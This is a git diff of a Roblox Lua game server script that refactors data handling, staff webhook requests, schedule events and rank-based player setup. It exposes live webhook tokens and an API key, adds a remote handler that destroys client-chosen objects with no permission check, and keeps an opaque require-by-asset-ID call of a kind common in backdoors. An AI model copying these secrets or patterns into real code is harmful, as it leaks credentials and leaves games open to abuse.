@@ -3,11 +3,15 @@ local RunService = game:GetService("RunService")
 
 local workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local ServerStorage = game:GetService("ServerStorage")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
 local ChatService = game:GetService("Chat")
 
 local Handlers = ReplicatedStorage:WaitForChild("Modules")
 local Events = ReplicatedStorage:WaitForChild("Events")
+local Server = ReplicatedStorage:WaitForChild("Server")
+local Schedule = Server:WaitForChild("Events")
 local Library = Handlers:WaitForChild("Library")
 
 local RagdollHandler = require(Handlers.RagdollHandler)
@@ -23,11 +27,11 @@ local SoundsHandler = require(Handlers.SoundsHandler)
 local Functions = require(Library.Functions)
 local loopNames = require(Library.LoopNames)
 local serverSettings = require(Library.Settings)
-local __externalData = require(script.Etc.__externalData)
-local WebhookHandler = require(script.Etc.WebhookHandler)
+local DataHandler = require(script.Etc.DataHandler)
 
 local RemoteEvent = Events.RemoteEvent
 local Thought = Events.Notifications.Thought
+local lastStaffRequest = 0
 local lastInsanityCheck = 0
 local lastInsaneTurn = 0
 local looping = false
@@ -43,11 +47,11 @@ function processActivity(baseDict,targetDoc,Player)
 			prevTime = tonumber(baseDict["fields"][stringId]["integerValue"])
 			total = math.floor(prevTime + ((tick() - Activity[Player])/60))
 			baseDict["fields"][stringId]["integerValue"] = total
-			__externalData.Set("player-activity",targetDoc,baseDict)
+			DataHandler.Set("player-activity",targetDoc,baseDict)
 		else
 			total = math.floor(((tick() - Activity[Player])/60))
 			baseDict["fields"][stringId] = {["integerValue"] = total}
-			__externalData.Set("player-activity",targetDoc,baseDict)
+			DataHandler.Set("player-activity",targetDoc,baseDict)
 		end
 	elseif baseDict["error"] ~= nil then
 		print("error",baseDict["error"])
@@ -73,13 +77,6 @@ function processInsanity()
 				end
 			end
 		end
-	end
-end
-
-function IsStaff(Player,Type)
-	if Player:FindFirstChild("PlayerInfo") ~= nil then
-		local min = 5 if Type == "Administration" then min = 100 elseif Type == "Oversight" then min = 233 elseif tonumber(Type) ~= nil then min = tonumber(Type) end
-		return (Player.PlayerInfo.Rank.Value >= min)
 	end
 end
 
@@ -138,15 +135,35 @@ function OnServerEvent(...)
 		for a,b in next,game.Players:GetPlayers() do
 			RemoteEvent:FireClient(b,"Phone Message",Args[1],FilteredText)
 		end
-	elseif Args[2] == "Schedule Change" then
-		for a,b in next,game.ReplicatedStorage.Schedule:GetChildren() do
-			if b.Value == nil and b.Name == Args[3] then
-				b.Value = Args[1]
-			end
+	elseif Args[2] == "Schedule" then
+		if Args[3] == "Create" then
+			local Name,Description = unpack(Args[4])
+			local newEvent = Instance.new("StringValue")
+			newEvent.Name = Name; newEvent.Value = Player.Name .. "/|/" .. Description
+		elseif Args[3] == "Edit" then
+			local Event,NewData = unpack(Args[4])
+			local Name,Description = unpack(NewData)
+			if Event == nil then return end
+			Event.Name = Name; Event.Value = Description
+		elseif Args[3] == "Cancel" then
+			local Event = Args[4]
+			Event:Destroy()
 		end
 	elseif Args[2] == "Staff Request" then
 		if Args[1].PlayerInfo.Rank >= 5 then
-			WebhookHandler.PostStaffRequest("https://discord.com/api/webhooks/830232162427076660/fuVLBnnHkwy2ov0e9LkPAPQgYtzpWblF53KICm4OZ21CG_83A6IEUeSua-tijdhTWMf0",Args[1],Args[3])
+			if tick()-lastStaffRequest >= 60 then
+				lastStaffRequest = tick()
+				local URL = "https://hooks.hyra.io/api/webhooks/896139436767727616/F0FzPFCXSHaOHtkK9NB7qSMthKYUJYd762g7elxmQ4i7QSsRWd1zLVoqzXZZuUUcX7ip"
+				-- local URL = "https://hooks.hyra.io/api/webhooks/863635162322829332/7nBU6e10pK35qRl5JH2VkQ8Z-1b0e0cjwgqZtbXX_vvgQNe6OsoWB2NRFC6AI7v3plic"
+				local Body = StaffRequestBodies.CreateBody(Player,Args[3])
+				local EncodedBody = HttpService:JsonEncode(Body)
+				local Success,Message = pcall(function()
+					HttpService:PostAsync(URL,EncodedBody)
+				end)
+				if Success then
+					Functions.StaffAlert({"<b>"..Player.Name.."<b> called for assistance.",true})
+				else warn("Error requesting staff: "..(Message or "Unknown message")) end
+			end
 		end
 	elseif Args[2] == "Loop Switch" then
 		if Args[1].PlayerInfo.Rank >= 5 then
@@ -205,52 +222,51 @@ function PlayerAdded(Player)
 	local PlayerRank,PlayerRole
 	serverSettings["Server Information"]["Players"] = serverSettings["Server Information"]["Players"]+1
 
-	if Player.AccountAge < 30 then 
---		Player:Kick("You cannot join the game until your account is a month old. Come back in "..30-Player.AccountAge.." days.")
+	if Player.AccountAge < 30 and RunService:IsStudio() == false then
+		Player:Kick("You cannot join the game until your account is a month old. Come back in "..30-Player.AccountAge.." days.")
 	end
 
 	Player.CharacterAppearanceLoaded:Connect(function(Character)
-		if PlayerRank == nil or PlayerRole == nil then
-			repeat wait() until PlayerRank ~= nil and PlayerRole ~= nil
-		end
-		local CIF = script.CharInfo:Clone()
+		if PlayerRank == nil or PlayerRole == nil then repeat wait() until PlayerRank ~= nil and PlayerRole ~= nil end
+
+		local CIF = ServerStorage.Storage.CharInfo:Clone()
 		CIF.Parent = Character
 
 		PhysicsHandler.onCharacterAdded(Character)
 		RagdollHandler.setupConstraints(Character)
 
-		ToolsHandler.GivePlayerTool(Player,{"Candle","Staff Phone","Meter Stick","Bucket of Water","Key","Silver Watch"})
+		ToolsHandler.GivePlayerTool(Player,serverSettings["Tool Information"][Functions.getGroup(PlayerRank)])
 
 		Character.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
 			StatsHandler.UpdateServerStats(Player,"Health",Character.Humanoid.Health)
 		end)
 
-		local RankUi = script.Rank:Clone()
+		local RankUi = ServerStorage.Storage.Rank:Clone()
 		RankUi.Main.Username.Text = Player.Name
 		RankUi.Main.Role.Text = PlayerRole
 		RankUi.Adornee = Character.Head
 		RankUi.Parent = Character
 	end)
 
-	local PIF = script.PlayerInfo:Clone()
+	local PIF = ServerStorage.Storage.PlayerInfo:Clone()
 	PlayerRank = Player:GetRankInGroup(10311167)
 	PlayerRole = Player:GetRoleInGroup(10311167)
 	PIF.Rank.Value = PlayerRank
 	PIF.Role.Value = PlayerRole
 	
 	-- > Sets stat looss rates
+	local LossValue = 0.1
 	if PlayerRank == 0 then
 		PlayerRole = "👁️ Lost Peculiar"
-		PIF.Stats.SprintLossRate.Value = 0.075
-	elseif PlayerRank >= 5 and PlayerRank < 100 then
+	elseif PlayerRank >= 5 then
 		serverSettings["Server Information"]["Staff"] = serverSettings["Server Information"]["Staff"]+1
-		PIF.Stats.SprintLossRate.Value = 0.15
-	elseif PlayerRank >= 100 then
-		serverSettings["Server Information"]["Staff"] = serverSettings["Server Information"]["Staff"]+1
-		PIF.Stats.SprintLossRate.Value = 0.5
-	elseif PlayerRank >= 240 then
-		serverSettings["Server Information"]["Staff"] = serverSettings["Server Information"]["Staff"]+1
-		PIF.Stats.SprintLossRate.Value = 1
+		if PlayerRank < 100 then
+			PIF.Stats.SprintLossRate.Value = 0.15
+		elseif PlayerRank >= 100 then
+			PIF.Stats.SprintLossRate.Value = 0.5
+		elseif PlayerRank >= 240 then
+			PIF.Stats.SprintLossRate.Value = 1
+		end
 	end
 
 	game.ReplicatedStorage.Server.Ext.Staff.Value = serverSettings["Server Information"]["Staff"]
@@ -269,8 +285,8 @@ function PlayerRemoving(Player)
 			end
 		end]]
 		if math.floor((tick() - Activity[Player])/60) >= 0 then
-			local alreadyData = __externalData.Get("player-activity",os.date("%B %Y",os.time()))
-			local lifetimeData = __externalData.Get("player-activity","Lifetime Activity")
+			local alreadyData = DataHandler.Get("player-activity",os.date("%B %Y",os.time()))
+			local lifetimeData = DataHandler.Get("player-activity","Lifetime Activity")
 			processActivity(alreadyData,os.date("%B %Y",os.time()),Player)
 			processActivity(lifetimeData,"Lifetime Activity",Player)
 		end
@@ -284,7 +300,7 @@ function Setup()
 	serverSettings["Server Information"]["Name"] = (loopNames["Adjective"][math.random(1,#loopNames["Adjective"])].." "..loopNames["Noun"][math.random(1,#loopNames["Noun"])])
 	game.ReplicatedStorage.Server.Ext.LoopName.Value = serverSettings["Server Information"]["Name"]
 	game.ReplicatedStorage.Server.Ext.JobId.Value = serverSettings["Server Information"]["JobId"]
-	__externalData.Setup("2f891160c02c4fb262656888a09ff199ae08efc82b4671a8413dc4b4101ffce2","thaexternaldata-33wzygh1aq")
+	DataHandler.Setup("2f891160c02c4fb262656888a09ff199ae08efc82b4671a8413dc4b4101ffce2","thaexternaldata-33wzygh1aq")
 	TimeHandler.Setup()
 	game.Lighting.ClockTime = 5
     require(5603385392)("dwKFccX44THicgKslaHg")
